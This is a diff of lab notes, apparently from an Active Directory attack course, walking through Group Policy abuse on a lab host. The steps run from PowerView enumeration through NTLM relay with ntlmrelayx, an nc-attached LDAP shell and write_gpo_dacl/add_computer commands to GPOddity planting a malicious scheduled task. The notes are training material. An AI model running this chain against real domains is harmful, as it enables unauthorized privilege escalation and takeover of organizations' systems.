@@ -4,7 +4,7 @@
 
 * Student VM - Name of the Group Policy attribute that is modified
 
-## Invishell
+### Invishell
 
 ```
 cd \AD\Tools
@@ -12,7 +12,10 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 . C:\AD\Tools\PowerView.ps1
 ```
 
-### &#x20;GPO for DCORP-CI
+GPO abuse for admin access on dcorp-ci
+
+
+Once we are local admin in student machine and view how we have admin priviliges into the pc "dcorp-ci", seach all GPOs in this machines with it command:
 
 <pre><code>Get-DomainGPO -ComputerIdentity DCORP-CI
 
@@ -42,6 +45,18 @@ objectcategory           : CN=Group-Policy-Container,CN=Schema,CN=Configuration,
 
 It appartains to <mark style="background-color:yellow;">DevOps Policy, we can confirm it using Get-DomainGPO -Identity 'DevOps Policy'</mark> command.
 
+> Remember the name of this GPO "DevOps Policy" 0BF8D01C-1F62-4BDC-958C-57140B67D147[^1]
+
+#### View it with BloodHound
+
+<figure><img src="../../../.gitbook/assets/image (546).png" alt=""><figcaption></figcaption></figure>
+
+Recall that we enumerated a user `devopsadmin` has `WriteDACL` on DevOps Policy. Let’s try to abuse this using GPOddity.
+
+> We can see it with blood too
+
+<figure><img src="../../../.gitbook/assets/image (547).png" alt=""><figcaption></figcaption></figure>
+
 ## Abuse an overly permissive Group Policy to get admin access on dcorp-ci.
 
 In Learning-Objective 1, we enumerated that there is a directory called 'AI' on the dcorp-ci machine where 'Everyone' has access. Looking at the directory **(\\\dcorp-ci\AI)**, we will find a log file.
@@ -66,13 +81,13 @@ You can start a session on Ubuntu WSL by searching for wsl in the search bar or 
 
 ### Run Ubuntu WS
 
-<figure><img src="../../../.gitbook/assets/image (532).png" alt=""><figcaption></figcaption></figure>
-
 > Run the following command in Ubuntu to execute ntlmrelayx. Keep in mind the following.
 >
 > 1. Use <mark style="background-color:yellow;">WSLToTh3Rescue!</mark> as the sudo password.
 > 2. Remember to replace the IP with your own student VM.
 > 3. <mark style="background-color:yellow;">Make sure that Firewall is either turned off on the student VM or you have added exceptions.</mark>
+
+<figure><img src="../../../.gitbook/assets/image (532).png" alt=""><figcaption></figcaption></figure>
 
 ```
 sudo ntlmrelayx.py -t ldaps://<IP_DC> -wh <IP_VM> --http-port '80,8080' -i --no-smb-server
@@ -151,15 +166,31 @@ WE HAVE VISIBILITY! So... now use nc to the next time it access, get us a shell 
 Using this ldap shell, we will provide the studentx user, WriteDACL permissions over Devops Policy {0BF8D01C-1F62-4BDC-958C-57140B67D147}:
 
 ```
+nc 127.0.0.1 11000
+```
+
+```
 write_gpo_dacl student113 {0BF8D01C-1F62-4BDC-958C-57140B67D147}
 ```
 
 <figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
 
-#### Alternative
+## Alternative - GPO abuse PC
 
-> Alternatively, if we do not have access to any doman users, we can add a computer object and provide it the 'write\_gpo\_dacl' permissions on DevOps policy {0BF8D01C-1F62-4BDC-958C-57140B67D147}
->
+Alternatively, if we do not have access to any doman users, we can add a computer object and provide it the 'write\_gpo\_dacl' permissions on DevOps policy {0BF8D01C-1F62-4BDC-958C-57140B67D147}
+
+First, create a new computer account into the AD (using the session previous obtaining with nc/ldap)
+
+```
+add_computer std113-gpattack Secretpass@123
+```
+
+After it, set permissions at this machine
+
+```
+write_gpo_dacl std113-gpattack$ {0BF8D01C-1F62-4BDC-958C-57140B67D147}
+```
+
 > ```
 > # add_computer stdx-gpattack Secretpass@123
 >
@@ -175,11 +206,21 @@ write_gpo_dacl student113 {0BF8D01C-1F62-4BDC-958C-57140B67D147}
 > LDAP server claims to have taken the secdescriptor. Have fun
 > ```
 
-Stop the ldap shell and ntlmrelayx using Ctrl + C.
+Stop the ldap shell and ntlmrelayx using `Ctrl + C`.
 
 Now, run the GPOddity command to create the new template.
 
 ### GPOddity commands
+
+> 1️⃣ Descarga la GPO legítima desde **SYSVOL**\
+> 2️⃣ Inserta una **Scheduled Task maliciosa**\
+> 3️⃣ Cambia el atributo:
+>
+> ```
+> gPCFileSysPath
+> ```
+>
+> para que el dominio cargue tu GPO falsa desde tu máquina.
 
 > Note: Use the same shell of nc ubuntu
 
@@ -192,7 +233,7 @@ sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domai
 
 <figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
 
-<mark style="background-color:yellow;">Leave GPOddity running and from another Ubuntu WSL session,</mark> create and share the stdx-gp directory:
+<mark style="background-color:yellow;">Leave GPOddity running and from another Ubuntu WSL session,</mark> create and share the std<mark style="background-color:yellow;">x</mark>-gp directory:
 
 ```
 mkdir /mnt/c/AD/Tools/std113-gp
@@ -209,6 +250,36 @@ icacls "C:\AD\Tools\std113-gp" /grant Everyone:F /T
 ```
 
 <figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
+
+#### Tarea Resume
+
+```
+Writable share
+        │ ## devopsadmin → WriteDACL → DevOps Policy
+        ▼
+devopsadmin ejecuta tu .lnk
+        │
+        ▼
+NTLM Relay → theft devopsadmin
+        │
+        ▼
+LDAP shell
+        │
+        ▼
+add_computer
+        │
+        ▼
+write_gpo_dacl
+        │
+        ▼
+GPOddity modifica GPO
+        │
+        ▼
+Scheduled Task ejecutada
+        │
+        ▼
+student113 → Local Admin in dcorp-ci
+```
 
 ## Verify if the gPCfileSysPath
 
